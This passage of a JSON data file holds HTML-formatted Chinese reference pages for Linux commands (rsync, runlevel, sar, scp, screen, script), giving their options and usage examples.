class=\"hljs-keyword\">exclude</span>={<span class=\"hljs-string\">'file1.txt'</span>,<span class=\"hljs-string\">'dir1/*'</span>} <span class=\"hljs-keyword\">source</span>/ destination\n</code></pre>\n<p>如果排除模式很多，可以将它们写入一个文件，每个模式一行，然后用 <code>--exclude-from</code> 参数指定这个文件。</p>\n<pre><code class=\"language-shell\">$ rsync -av --<span class=\"hljs-keyword\">exclude</span>-<span class=\"hljs-keyword\">from</span>=<span class=\"hljs-string\">'exclude-file.txt'</span> <span class=\"hljs-keyword\">source</span>/ destination\n</code></pre>\n<p><strong>指定必须同步的文件模式</strong></p>\n<p><code>--include</code> 参数用来指定必须同步的文件模式，往往与 <code>--exclude</code> 结合使用。</p>\n<pre><code class=\"language-shell\">$ rsync -av --<span class=\"hljs-keyword\">include</span>=<span class=\"hljs-string\">\"*.txt\"</span> --<span class=\"hljs-keyword\">exclude</span>=<span class=\"hljs-string\">'*'</span> <span class=\"hljs-keyword\">source</span>/ destination\n</code></pre>\n<p>上面命令指定同步时，排除所有文件，但是会包括 <code>TXT</code> 文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "runlevel",
        "des": "打印当前Linux系统的运行等级",
        "body": "<h1 id=\"runlevel\">runlevel</h1>\n<p>打印当前Linux系统的运行等级</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>runlevel命令</strong> 用于打印当前Linux系统的运行等级。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">runlevel</span>\n</code></pre>\n<h3 id=\"知识扩展\">知识扩展</h3>\n<p>linux操作系统自从开始启动至启动完毕需要经历几个不同的阶段，这几个阶段就叫做runlevel，同样，当linux操作系统关闭时也要经历另外几个不同的runlevel，下面我们就准备详细介绍一下runlevel，并向您展示一些小技巧来让您的linux系统避免不必要的重启动。</p>\n<p>runlevel可以认为是系统状态，形象一点，您可以认为runlevel有点象微软的windows操作系统中的Normal，safemode，和command prompt only。进入每个runlevel都需要启动或关闭相应的一系列服务(services)，这些服务(services)以初始化脚本的方式放置于目录<code>/etc/rc.d/rc?.d/</code>或者<code>/etc/rc?.d</code>下面（?代表runlevel的对应序号）。</p>\n<p>在大多数的linux发行版本中，通常有8个runlevel：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-number\">0</span> 停机\n<span class=\"hljs-number\">1</span> 单用户模式\n<span class=\"hljs-number\">2</span> 多用户，没有 NFS\n<span class=\"hljs-number\">3</span> 完全多用户模式\n<span class=\"hljs-number\">4</span> 没有用到\n<span class=\"hljs-number\">5</span> 图形界面\n<span class=\"hljs-number\">6</span> 重新启动\nS s Single <span class=\"hljs-keyword\">user</span> <span class=\"hljs-title\">mode</span>\n</code></pre>\n<p>多数的桌面的linux系统缺省的runlevel是5，用户登陆时是图形界面，而多数的服务器版本的linux系统缺省的runlevel是3，用户登陆时是字符界面，runlevel 1和2除了调试之外很少使用，runlevel s和S并不是直接给用户使用，而是用来为Single user mode作准备。</p>\n<p>linux的运行模式比起windows的启动模式的优势在于：你可以在系统空闲时使用init命令切换你现在使用的runlevel，另外，当你关闭或者启动linux系统时你已经不知不觉中切换你的runlevel，系统关机进程需要调用runlevel(0或6)来关闭所有正在运行中的进程。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "sar",
        "des": "系统运行状态统计工具",
        "body": "<h1 id=\"sar\">sar</h1>\n<p>系统运行状态统计工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sar命令</strong> 是Linux下系统运行状态统计工具，它将指定的操作系统状态计数器显示到标准输出设备。sar工具将对系统当前的状态进行取样，然后通过计算数据和比例来表达系统的当前运行状态。它的特点是可以连续对系统取样，获得大量的取样数据。取样数据和分析的结果都可以存入文件，使用它时消耗的系统资源很小。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">sar</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-A：显示所有的报告信息；</span>\n<span class=\"hljs-deletion\">-b：显示I/O速率；</span>\n<span class=\"hljs-deletion\">-B：显示换页状态；</span>\n<span class=\"hljs-deletion\">-c：显示进程创建活动；</span>\n<span class=\"hljs-deletion\">-d：显示每个块设备的状态；</span>\n<span class=\"hljs-deletion\">-e：设置显示报告的结束时间；</span>\n<span class=\"hljs-deletion\">-f：从指定文件提取报告；</span>\n<span class=\"hljs-deletion\">-i：设状态信息刷新的间隔时间；</span>\n<span class=\"hljs-deletion\">-P：报告每个CPU的状态；</span>\n<span class=\"hljs-deletion\">-R：显示内存状态；</span>\n<span class=\"hljs-deletion\">-u：显示CPU利用率；</span>\n<span class=\"hljs-deletion\">-v：显示索引节点，文件和其他内核表的状态；</span>\n<span class=\"hljs-deletion\">-w：显示交换分区状态；</span>\n<span class=\"hljs-deletion\">-x：显示给定进程的状态。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  间隔时间：每次报告的间隔时间（秒）；</li>\n<li>  次数：显示报告的次数。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>察看内存和交换空间的使用率：</strong> </p>\n<pre><code class=\"language-shell\">sar -r\nLinux 2.4.20-8 (www.jsdig.com)   <span class=\"hljs-number\"> 20130503 </span> \n12:00:01 AM kbmemfree kbmemused  %memused \nkbmemshrd kbbuffers  kbcached  \n12:10:00 AM   <span class=\"hljs-number\"> 240468 </span> <span class=\"hljs-number\"> 1048252 </span>    81.34    \n0   <span class=\"hljs-number\"> 133724 </span>  <span class=\"hljs-number\"> 485772 </span> \n12:20:00 AM   <span class=\"hljs-number\"> 240508 </span> <span class=\"hljs-number\"> 1048212 </span>    81.34   \n0   <span class=\"hljs-number\"> 134172 </span>  <span class=\"hljs-number\"> 485600 </span> \n…  \n08:40:00 PM   <span class=\"hljs-number\"> 934132 </span>  <span class=\"hljs-number\"> 354588 </span>    27.51    \n0    <span class=\"hljs-number\"> 26080 </span>  <span class=\"hljs-number\"> 185364 </span> \nAverage:      <span class=\"hljs-number\"> 324346 </span>  <span class=\"hljs-number\"> 964374 </span>    74.83  \n0    <span class=\"hljs-number\"> 96072 </span>  <span class=\"hljs-number\"> 467559 </span>\n</code></pre>\n<p>kbmemfree与kbmemused字段分别显示内存的未使用与已使用空间，后面跟着的是已使用空间的百分比（%memused字段）。kbbuffers与kbcached字段分别显示缓冲区与系统全域的数据存取量，单位为KB。</p>\n<p> <strong>观察系统部件10分钟，并对数据进行排序：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sar</span> -o temp <span class=\"hljs-number\">60</span> <span class=\"hljs-number\">10</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "scp",
        "des": "加密的方式在本地主机和远程主机之间复制文件",
        "body": "<h1 id=\"scp\">scp</h1>\n<p>加密的方式在本地主机和远程主机之间复制文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>scp命令</strong> 用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。可能会稍微影响一下速度。当你服务器硬盘变为只读read&nbsp;only&nbsp;system时，用scp可以帮你把文件移出来。另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。虽然&nbsp;rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">scp</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-1：使用ssh协议版本1；</span>\n<span class=\"hljs-deletion\">-2：使用ssh协议版本2；</span>\n<span class=\"hljs-deletion\">-4：使用ipv4；</span>\n<span class=\"hljs-deletion\">-6：使用ipv6；</span>\n<span class=\"hljs-deletion\">-B：以批处理模式运行；</span>\n<span class=\"hljs-deletion\">-C：使用压缩；</span>\n<span class=\"hljs-deletion\">-F：指定ssh配置文件；</span>\n<span class=\"hljs-deletion\">-i：identity_file 从指定文件中读取传输时使用的密钥文件（例如亚马逊云pem），此参数直接传递给ssh；</span>\n<span class=\"hljs-deletion\">-l：指定宽带限制；</span>\n<span class=\"hljs-deletion\">-o：指定使用的ssh选项；</span>\n<span class=\"hljs-deletion\">-P：指定远程主机的端口号；</span>\n<span class=\"hljs-deletion\">-p：保留文件的最后修改时间，最后访问时间和权限模式；</span>\n<span class=\"hljs-deletion\">-q：不显示复制进度；</span>\n<span class=\"hljs-deletion\">-r：以递归方式复制。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>源文件：指定要复制的源文件。</li>\n<li>目标文件：目标文件。格式为<code>user@host：filename</code>（文件名为目标文件的名称）。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>从远程复制到本地的scp命令与上面的命令雷同，只要将从本地复制到远程的命令后面2个参数互换顺序就行了。</p>\n<p> <strong>从远程机器复制文件到本地目录</strong> </p>\n<pre><code class=\"language-shell\">scp root<span class=\"hljs-variable\">@10</span>.<span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">10</span><span class=\"hljs-symbol\">:/opt/soft/nginx-</span>0.<span class=\"hljs-number\">5.38</span>.tar.gz /opt/soft/\n</code></pre>\n<p>从10.10.10.10机器上的<code>/opt/soft/</code>的目录中下载nginx-0.5.38.tar.gz&nbsp;文件到本地<code>/opt/soft/</code>目录中。</p>\n<p><strong>从亚马逊云复制OpenVPN到本地目录</strong> </p>\n<pre><code class=\"language-shell\">scp -i amazon.pem ubuntu<span class=\"hljs-variable\">@10</span>.<span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">10</span><span class=\"hljs-symbol\">:/usr/local/openvpn_as/etc/exe/openvpn-connect-</span><span class=\"hljs-number\">2.1</span>.<span class=\"hljs-number\">3.110</span>.dmg openvpn-connect<span class=\"hljs-number\">-2.1</span>.<span class=\"hljs-number\">3.110</span>.dmg\n</code></pre>\n<p>从10.10.10.10机器上下载openvpn安装文件到本地当前目录来。</p>\n<p> <strong>从远程机器复制到本地</strong> </p>\n<pre><code class=\"language-shell\">scp -r root<span class=\"hljs-variable\">@10</span>.<span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">10</span><span class=\"hljs-symbol\">:/opt/soft/mongodb</span> /opt/soft/\n</code></pre>\n<p>从10.10.10.10机器上的<code>/opt/soft/</code>中下载mongodb目录到本地的<code>/opt/soft/</code>目录来。</p>\n<p> <strong>上传本地文件到远程机器指定目录</strong> </p>\n<pre><code class=\"language-shell\">scp /opt/soft/nginx-0.<span class=\"hljs-number\">5.38</span>.tar.gz root<span class=\"hljs-variable\">@10</span>.<span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">10</span><span class=\"hljs-symbol\">:/opt/soft/scptest</span>\n<span class=\"hljs-comment\"># 指定端口 2222</span>\nscp -rp -P <span class=\"hljs-number\">2222</span> /opt/soft/nginx-0.<span class=\"hljs-number\">5.38</span>.tar.gz root<span class=\"hljs-variable\">@10</span>.<span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">10</span><span class=\"hljs-symbol\">:/opt/soft/scptest</span>\n</code></pre>\n<p>复制本地<code>/opt/soft/</code>目录下的文件nginx-0.5.38.tar.gz到远程机器10.10.10.10的<code>opt/soft/scptest</code>目录。</p>\n<p> <strong>上传本地目录到远程机器指定目录</strong> </p>\n<pre><code class=\"language-shell\">scp -r /opt/soft/mongodb root<span class=\"hljs-variable\">@10</span>.<span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">10</span><span class=\"hljs-symbol\">:/opt/soft/scptest</span>\n</code></pre>\n<p>上传本地目录<code>/opt/soft/mongodb</code>到远程机器10.10.10.10上<code>/opt/soft/scptest</code>的目录中去。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "screen",
        "des": "用于命令行终端切换",
        "body": "<h1 id=\"screen\">screen</h1>\n<p>用于命令行终端切换</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>Screen</strong> 是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。</p>\n<p> <strong>会话恢复</strong> </p>\n<p>只要Screen本身没有终止，在其内部运行的会话都可以恢复。这一点对于远程登录的用户特别有用——即使网络连接中断，用户也不会失去对已经打开的命令行会话的控制。只要再次登录到主机上执行screen -r就可以恢复会话的运行。同样在暂时离开的时候，也可以执行分离命令detach，在保证里面的程序正常运行的情况下让Screen挂起（切换到后台）。这一点和图形界面下的VNC很相似。</p>\n<p> <strong>多窗口</strong> </p>\n<p>在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。Screen实现了基本的文本操作，如复制粘贴等；还提供了类似滚动条的功能，可以查看窗口状况的历史记录。窗口还可以被分区和命名，还可以监视后台窗口的活动。 会话共享 Screen可以让一个或多个用户从不同终端多次登录一个会话，并共享会话的所有特性（比如可以看到完全相同的输出）。它同时提供了窗口访问权限的机制，可以对窗口进行密码保护。</p>\n<p>GNU's Screen 官方站点：<a href=\"http://www.gnu.org/software/screen/\">http://www.gnu.org/software/screen/</a></p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"># screen -AmRvx -<span class=\"hljs-selector-attr\">[ls -wipe]</span><span class=\"hljs-selector-attr\">[-d &lt;作业名称&gt;]</span><span class=\"hljs-selector-attr\">[-h &lt;行数&gt;]</span><span class=\"hljs-selector-attr\">[-r &lt;作业名称&gt;]</span><span class=\"hljs-selector-attr\">[-s ]</span><span class=\"hljs-selector-attr\">[-S &lt;作业名称&gt;]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-A 　将所有的视窗都调整为目前终端机的大小。</span>\n<span class=\"hljs-deletion\">-d &lt;作业名称&gt; 　将指定的screen作业离线。</span>\n<span class=\"hljs-deletion\">-h &lt;行数&gt; 　指定视窗的缓冲区行数。</span>\n<span class=\"hljs-deletion\">-m 　即使目前已在作业中的screen作业，仍强制建立新的screen作业。</span>\n<span class=\"hljs-deletion\">-r &lt;作业名称&gt; 　恢复离线的screen作业。</span>\n<span class=\"hljs-deletion\">-R 　先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。</span>\n<span class=\"hljs-deletion\">-s 　指定建立新视窗时，所要执行的shell。</span>\n<span class=\"hljs-deletion\">-S &lt;作业名称&gt; 　指定screen作业的名称。</span>\n<span class=\"hljs-deletion\">-v 　显示版本信息。</span>\n<span class=\"hljs-deletion\">-x 　恢复之前离线的screen作业。</span>\n<span class=\"hljs-deletion\">-ls或--list 　显示目前所有的screen作业。</span>\n<span class=\"hljs-deletion\">-wipe 　检查目前所有的screen作业，并删除已经无法使用的screen作业。</span>\n</code></pre>\n<h3 id=\"常用screen参数\">常用screen参数</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">screen</span> -S yourname -&gt;</span> 新建一个叫yourname的session\n<span class=\"hljs-function\"><span class=\"hljs-title\">screen</span> -ls -&gt;</span> 列出当前所有的session\n<span class=\"hljs-function\"><span class=\"hljs-title\">screen</span> -r yourname -&gt;</span> 回到yourname这个session\n<span class=\"hljs-function\"><span class=\"hljs-title\">screen</span> -d yourname -&gt;</span> 远程detach某个session\n<span class=\"hljs-function\"><span class=\"hljs-title\">screen</span> -d -r yourname -&gt;</span> 结束当前session并回到yourname这个session\n</code></pre>\n<p>在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始。</p>\n<pre><code class=\"language-shell\">C-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> ? -&gt;</span> 显示所有键绑定信息\nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> c -&gt;</span> 创建一个新的运行shell的窗口并切换到该窗口\nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> n -&gt;</span> Next，切换到下一个 window \nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> p -&gt;</span> Previous，切换到前一个 window \nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> 0..9 -&gt;</span> 切换到第 <span class=\"hljs-number\">0</span>..<span class=\"hljs-number\">9</span> 个 window\nC<span class=\"hljs-function\"><span class=\"hljs-title\">trl</span>+a [Space] -&gt;</span> 由视窗<span class=\"hljs-number\">0</span>循序切换到视窗<span class=\"hljs-number\">9</span>\nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> C-a -&gt;</span> 在两个最近使用的 window 间切换 \nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> x -&gt;</span> 锁住当前的 window，需用用户密码解锁\nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> d -&gt;</span> detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。 \nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> z -&gt;</span> 把当前session放到后台执行，用 shell 的 fg 命令则可回去。\nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> w -&gt;</span> 显示所有窗口列表\nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> t -&gt;</span> <span class=\"hljs-built_in\">time</span>，显示当前时间，和系统的 load \nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> k -&gt;</span> kill window，强行关闭当前的 window\nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span>  -&gt;</span> 进入 copy mode，在 copy mode 下可以回滚、搜索、复制就像用使用 [vi 一样\n    C-b Backward，PageUp \n    C-f Forward，PageDown \n    H(大写) High，将光标移至左上角 \n    L Low，将光标移至左下角 \n    <span class=\"hljs-number\">0</span> 移到行首 \n    $ 行末 \n    w forward one word，以字为单位往前移 \n    b backward one word，以字为单位往后移 \n    Space 第一次按为标记区起点，第二次按为终点 \n    Esc 结束 copy mode \nC-<span class=\"hljs-function\"><span class=\"hljs-title\">a</span> ] -&gt;</span> paste，把刚刚在 copy mode 选定的内容贴上\n</code></pre>\n<h3 id=\"使用-screen\">使用 screen</h3>\n<p> <strong>安装screen</strong> </p>\n<p>流行的Linux发行版（例如Red Hat Enterprise Linux）通常会自带screen实用程序，如果没有的话，可以从GNU screen的官方网站下载。</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># yum install screen</span>\n[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># rpm -qa|grep screen</span>\nscreen<span class=\"hljs-number\">-4.0</span><span class=\"hljs-number\">.3</span><span class=\"hljs-number\">-4.</span>el5\n[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\">#</span>\n</code></pre>\n<p> <strong>创建一个新的窗口</strong> </p>\n<p>安装完成后，直接敲命令screen就可以启动它。但是这样启动的screen会话没有名字，实践上推荐为每个screen会话取一个名字，方便分辨：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen&nbsp;-S david </span>\n</code></pre>\n<p>screen启动后，会创建第一个窗口，也就是窗口No. 0，并在其中打开一个系统默认的shell，一般都会是bash。所以你敲入命令screen之后，会立刻又返回到命令提示符，仿佛什么也没有发生似的，其实你已经进入Screen的世界了。当然，也可以在screen命令之后加入你喜欢的参数，使之直接打开你指定的程序，例如：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen vi david.txt</span>\n</code></pre>\n<p>screen创建一个执行vi david.txt的单窗口会话，退出vi 将退出该窗口/会话。</p>\n<p> <strong>查看窗口和窗口名称</strong> </p>\n<p>打开多个窗口后，可以使用快捷键C-a w列出当前所有窗口。如果使用文本终端，这个列表会列在屏幕左下角，如果使用X环境下的终端模拟器，这个列表会列在标题栏里。窗口列表的样子一般是这样：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-number\">0</span><span class=\"hljs-variable\">$ </span>bash  <span class=\"hljs-number\">1</span>-<span class=\"hljs-variable\">$ </span>bash  <span class=\"hljs-number\">2</span>*<span class=\"hljs-variable\">$ </span>bash  \n</code></pre>\n<p>这个例子中我开启了三个窗口，其中*号表示当前位于窗口2，-号表示上一次切换窗口时位于窗口1。</p>\n<p>Screen默认会为窗口命名为编号和窗口中运行程序名的组合，上面的例子中窗口都是默认名字。练习了上面查看窗口的方法，你可能就希望各个窗口可以有不同的名字以方便区分了。可以使用快捷键C-a A来为当前窗口重命名，按下快捷键后，Screen会允许你为当前窗口输入新的名字，回车确认。</p>\n<p> <strong>会话分离与恢复</strong> </p>\n<p>你可以不中断screen窗口中程序的运行而暂时断开（detach）screen会话，并在随后时间重新连接（attach）该会话，重新控制各窗口中运行的程序。例如，我们打开一个screen窗口编辑/tmp/david.txt文件：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen vi /tmp/david.txt</span>\n</code></pre>\n<p>之后我们想暂时退出做点别的事情，比如出去散散步，那么在screen窗口键入C-a d，Screen会给出detached提示：</p>\n<p>暂时中断会话</p>\n<p>半个小时之后回来了，找到该screen会话：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen -ls</span>\n</code></pre>\n<p>重新连接会话：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen -r 12865</span>\n</code></pre>\n<p>一切都在。</p>\n<p>当然，如果你在另一台机器上没有分离一个Screen会话，就无从恢复会话了。这时可以使用下面命令强制将这个会话从它所在的终端分离，转移到新的终端上来：</p>\n<p> <strong>清除dead 会话</strong> </p>\n<p>如果由于某种原因其中一个会话死掉了（例如人为杀掉该会话），这时screen -list会显示该会话为dead状态。使用screen -wipe命令清除该会话：</p>\n<p> <strong>关闭或杀死一个Screen会话</strong> </p>\n<p>正常情况下，当你退出一个窗口中最后一个程序（通常是bash）后，这个窗口就关闭了。另一个关闭窗口的方法是使用<code>ctrl</code>+<code>a</code> 键，然后按下<code>k</code>键，最后当提示你是否要杀死这个会话时按下<code>y</code>键，这个快捷键会杀死当前的窗口，同时也将杀死这个窗口中正在运行的进程。</p>\n<p>如果一个Screen会话中最后一个窗口被关闭了，那么整个Screen会话也就退出了，screen进程会被终止。</p>\n<p>除了依次退出/杀死当前Screen会话中所有窗口这种方法之外，还可以使用快捷键C-a :，然后输入quit命令退出Screen会话。需要注意的是，这样退出会杀死所有窗口并退出其中运行的所有程序。其实C-a :这个快捷键允许用户直接输入的命令有很多，包括分屏可以输入split等，这也是实现Screen功能的一个途径，不过个人认为还是快捷键比较方便些。</p>\n<p>此外，这里再介绍另外一种快速杀死一个Screen会话的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen -ls   #列出存在的会话</span>\n[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen -XS <span class=\"hljs-string\">\"会话id或者名称\"</span> quit</span>\n</code></pre>\n<p><strong>示例：</strong></p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen -ls</span>\nThere are screens on:\n    <span class=\"hljs-number\">11235.</span>test    (<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">25</span>/<span class=\"hljs-number\">2021</span> <span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">35</span>:<span class=\"hljs-number\">31</span> PM)    (Detached)\n<span class=\"hljs-number\">1</span> Sockets <span class=\"hljs-keyword\">in</span> /<span class=\"hljs-built_in\">run</span>/screen/S-root.\n[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen -XS 11235 quit</span>\n<span class=\"hljs-meta\">#或者</span>\n[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen -XS test quit</span>\n</code></pre>\n<h3 id=\"screen-高级应用\">screen 高级应用</h3>\n<p> <strong>会话共享</strong> </p>\n<p>还有一种比较好玩的会话恢复，可以实现会话共享。假设你在和朋友在不同地点以相同用户登录一台机器，然后你创建一个screen会话，你朋友可以在他的终端上命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen -x</span>\n</code></pre>\n<p>这个命令会将你朋友的终端Attach到你的Screen会话上，并且你的终端不会被Detach。这样你就可以和朋友共享同一个会话了，如果你们当前又处于同一个窗口，那就相当于坐在同一个显示器前面，你的操作会同步演示给你朋友，你朋友的操作也会同步演示给你。当然，如果你们切换到这个会话的不同窗口中去，那还是可以分别进行不同的操作的。</p>\n<p> <strong>会话锁定与解锁</strong> </p>\n<p>Screen允许使用快捷键C-a s锁定会话。锁定以后，再进行任何输入屏幕都不会再有反应了。但是要注意虽然屏幕上看不到反应，但你的输入都会被Screen中的进程接收到。快捷键C-a q可以解锁一个会话。</p>\n<p>也可以使用C-a x锁定会话，不同的是这样锁定之后，会话会被Screen所属用户的密码保护，需要输入密码才能继续访问这个会话。</p>\n<p> <strong>发送命令到screen会话</strong> </p>\n<p>在Screen会话之外，可以通过screen命令操作一个Screen会话，这也为使用Screen作为脚本程序增加了便利。关于Screen在脚本中的应用超出了入门的范围，这里只看一个例子，体会一下在会话之外对Screen的操作：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@TS</span>-DEV ~]<span class=\"hljs-meta\"># screen -S sandy -X screen ping www.baidu.com</span>\n</code></pre>\n<p>这个命令在一个叫做sandy的screen会话中创建一个新窗口，并在其中运行ping命令。</p>\n<p> <strong>屏幕分割</strong> </p>\n<p>现在显示器那么大，将一个屏幕分割成不同区域显示不同的Screen窗口显然是个很酷的事情。可以使用快捷键C-a S将显示器水平分割，Screen 4.00.03版本以后，也支持垂直分屏，快捷键是C-a |。分屏以后，可以使用C-a <tab>在各个区块间切换，每一区块上都可以创建窗口并在其中运行进程。</tab></p>\n<p>可以用C-a X快捷键关闭当前焦点所在的屏幕区块，也可以用C-a Q关闭除当前区块之外其他的所有区块。关闭的区块中的窗口并不会关闭，还可以通过窗口切换找到它。</p>\n<p> <strong>C/P模式和操作</strong> </p>\n<p>screen的另一个很强大的功能就是可以在不同窗口之间进行复制粘贴了。使用快捷键C-a <esc>或者C-a [可以进入copy/paste模式，这个模式下可以像在vi中一样移动光标，并可以使用空格键设置标记。其实在这个模式下有很多类似vi的操作，譬如使用/进行搜索，使用y快速标记一行，使用w快速标记一个单词等。关于C/P模式下的高级操作，其文档的这一部分有比较详细的说明。</esc></p>\n<p>一般情况下，可以移动光标到指定位置，按下空格设置一个开头标记，然后移动光标到结尾位置，按下空格设置第二个标记，同时会将两个标记之间的部分储存在copy/paste buffer中，并退出copy/paste模式。在正常模式下，可以使用快捷键C-a ]将储存在buffer中的内容粘贴到当前窗口。</p>\n<p> <strong>更多screen功能</strong> </p>\n<p>同大多数UNIX程序一样，GNU&nbsp;Screen提供了丰富强大的定制功能。你可以在Screen的默认两级配置文件/etc/screenrc和$HOME/.screenrc中指定更多，例如设定screen选项，定制绑定键，设定screen会话自启动窗口，启用多用户模式，定制用户访问权限控制等等。如果你愿意的话，也可以自己指定screen配置文件。</p>\n<p>以多用户功能为例，screen默认是以单用户模式运行的，你需要在配置文件中指定multiuser on 来打开多用户模式，通过acl*（acladd,acldel,aclchg...）命令，你可以灵活配置其他用户访问你的screen会话。更多配置文件内容请参考screen的man页。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "script",
        "des": "记录终端会话的所有操作",
        "body": "<h1 id=\"script\">script</h1>\n<p>记录终端会话的所有操作</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>script</strong> 用于在终端会话中，记录用户的所有操作和命令的输出信息。简而言之，记录终端会话发生的一切信息，如同一台终端录像机。例如，用户在输入某条命令时，字符的键入和删除也都会被记录。用户在终端的所有操作、终端的回显等信息会被以 <code>raw</code> 格式存储在日志文件，称为终端数据文件。命令的时间信息会被单独以另一种结构储存为日志文件，称为时间日志文件。使用命令<code>exit</code>或者快捷键<code>Ctrl + D</code>停止记录。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">script</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-a, <span class=\"hljs-params\">--append</span>              <span class=\"hljs-comment\"># 对终端会话的操作信息，以追加方式写入文件（保留原文件内容）</span>\n-c, <span class=\"hljs-params\">--command</span> <span class=\"hljs-keyword\">command</span>  